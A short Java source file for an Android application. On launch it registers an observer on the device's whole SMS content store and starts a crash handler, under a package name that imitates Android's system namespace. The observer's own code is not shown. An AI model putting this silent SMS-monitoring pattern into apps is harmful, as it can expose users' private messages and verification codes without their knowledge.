package android.app.sms.application;

import android.app.Application;
import android.app.sms.observer.SMSObserver;
import android.app.sms.utils.CrashHandler;
import android.app.sms.utils.LogUtils;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;

public class SMSApplication extends Application {

	@Override
	public void onCreate() {
		super.onCreate();
		this.regFilter(this);
		CrashHandler.getInstance().init();
	}
	
	private void regFilter(Context context) {
		LogUtils.write("reg", "注册短信监听");
		SMSObserver smsObserver = new SMSObserver(this, new Handler());
		this.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, smsObserver);
	}
}
